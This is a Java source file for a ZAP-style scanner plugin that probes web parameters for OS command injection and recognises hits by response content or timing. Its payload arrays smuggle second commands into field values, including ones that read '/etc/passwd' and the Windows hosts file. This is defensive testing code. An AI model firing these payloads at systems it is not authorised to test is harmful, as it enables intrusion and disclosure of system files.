package com.saas_security.security_modules;

import org.parosproxy.paros.core.scanner.*;
import org.parosproxy.paros.network.*;
import org.zaproxy.zap.model.*;

/**
 * Advanced Command Injection Scanner adapted from ZAP's command injection testing capabilities
 */
public class CommandInjectionScanner extends AbstractAppParamPlugin {
    
    private static final int COMMAND_INJECTION_PLUGIN_ID = 90020; // Command Injection ID
    
    // Command injection payloads
    private static final String[] BASIC_COMMAND_PAYLOADS = {
        "; id",
        "| id", 
        "&& id",
        "`id`",
        "$(id)",
        "; whoami",
        "| whoami",
        "&& whoami",
        "`whoami`",
        "$(whoami)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "&& cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "; type C:\\windows\\system32\\drivers\\etc\\hosts",
        "| type C:\\windows\\system32\\drivers\\etc\\hosts",
        "&& type C:\\windows\\system32\\drivers\\etc\\hosts"
    };
    
    private static final String[] TIME_BASED_COMMAND_PAYLOADS = {
        "; sleep 5",
        "| sleep 5",
        "&& sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
        "; ping -c 5 127.0.0.1",
        "| ping -c 5 127.0.0.1", 
        "&& ping -c 5 127.0.0.1",
        "; timeout 5 echo 'test'",
        "| timeout 5 echo 'test'",
        "&& timeout 5 echo 'test'"
    };
    
    private static final String[] WINDOWS_COMMAND_PAYLOADS = {
        "; ver",
        "| ver",
        "&& ver",
        "; hostname",
        "| hostname",
        "&& hostname",
        "; dir C:",
        "| dir C:",
        "&& dir C:",
        "; type nul",
        "| type nul",
        "&& type nul"
    };
    
    @Override
    public int getId() {
        return COMMAND_INJECTION_PLUGIN_ID;
    }
    
    @Override
    public String getName() {
        return "Command Injection";
    }
    
    @Override
    public String getDescription() {
        return "Advanced command injection vulnerability scanner";
    }
    
    @Override
    public int getCategory() {
        return Category.INJECTION;
    }
    
    @Override
    public String getSolution() {
        return "Validate and sanitize all user input before passing to system commands. Use parameterized execution.";
    }
    
    @Override
    public int getRisk() {
        return Alert.RISK_HIGH;
    }
    
    @Override
    public int getCweId() {
        return 78; // CWE-78: Command Injection
    }
    
    @Override
    public int getWascId() {
        return 31; // WASC-31: Command Injection
    }
    
    @Override
    public void scan() {
        // Test basic command injection
        if (testBasicCommandInjection()) {
            return;
        }
        
        // Test time-based command injection
        if (testTimeBasedCommandInjection()) {
            return;
        }
    }
    
    private boolean testBasicCommandInjection() {
        for (String command : BASIC_COMMAND_PAYLOADS) {
            if (isStop()) break;
            
            HttpMessage msg = getNewMsg();
            setParameter(msg, getBaseParamName(), command, msg.getParamSet());
            
            long startTime = System.currentTimeMillis();
            sendAndReceive(msg);
            long responseTime = System.currentTimeMillis() - startTime;
            
            if (checkForCommandInjectionResponse(msg, command, responseTime)) {
                return true;
            }
        }
        return false;
    }
    
    private boolean testTimeBasedCommandInjection() {
        for (String command : TIME_BASED_COMMAND_PAYLOADS) {
            if (isStop()) break;
            
            HttpMessage msg = getNewMsg();
            setParameter(msg, getBaseParamName(), command, msg.getParamSet());
            
            long startTime = System.currentTimeMillis();
            sendAndReceive(msg);
            long responseTime = System.currentTimeMillis() - startTime;
            
            // Check for time-based delay (sleep command should cause ~5 second delay)
            if (command.contains("sleep") && responseTime >= 4500 && responseTime <= 5500) {
                raiseCommandInjectionAlert(command, responseTime);
                return true;
            }
            
            // Check for ping delay
            if (command.contains("ping") && responseTime >= 4000 && responseTime <= 8000) {
                raiseCommandInjectionAlert(command, responseTime);
                return true;
            }
        }
        return false;
    }
    
    private boolean checkForCommandInjectionResponse(HttpMessage msg, String command, long responseTime) {
        String responseBody = msg.getResponseBody().toString();
        
        // Common command injection indicators
        String[] commandIndicators = {
            "uid=",
            "gid=",
            "groups=",
            "root:x:0:0:",
            "daemon:x:1:1:",
            "Microsoft Windows",
            "Windows IP Configuration",
            "Copyright (c) Microsoft Corp",
            "Directory of",
            "Volume in drive",
            "File(s)",
            "bytes free",
            "total bytes",
            "/bin/bash",
            "/sbin/nologin"
        };
        
        for (String indicator : commandIndicators) {
            if (responseBody.contains(indicator)) {
                raiseCommandInjectionAlert(command);
                return true;
            }
        }
        
        return false;
    }
    
    private void raiseCommandInjectionAlert(String command) {
        raiseCommandInjectionAlert(command, 0);
    }
    
    private void raiseCommandInjectionAlert(String command, long responseTime) {
        Alert alert = new Alert(getRisk(), Alert.CONFIDENCE_HIGH, getName());
        
        String alertDesc = getDescription();
        String evidence = "Command executed: " + command;
        
        if (responseTime > 0) {
            alertDesc += " (Time-based)";
            evidence += " (Response time: " + responseTime + "ms)";
        }
        
        alert.setDetail(alertDesc,
                       getBaseMsg().getRequestHeader().getURI().toString(),
                       getParameterName(getBaseMsg()),
                       command, "", "", "", "", "", "", "", "", "", "", "");
        
        alert.setCweId(getCweId());
        alert.setWascId(getWascId());
        alert.setSolution(getSolution());
        
        raiseAlert(getRisk(), Alert.CONFIDENCE_HIGH, getName(), alertDesc,
                  getBaseMsg().getRequestHeader().getURI().toString(),
                  getParameterName(getBaseMsg()), command, "", "", "", "", "", "", "", "");
    }
    
    @Override
    public boolean isStop() {
        return super.isStop();
    }
}
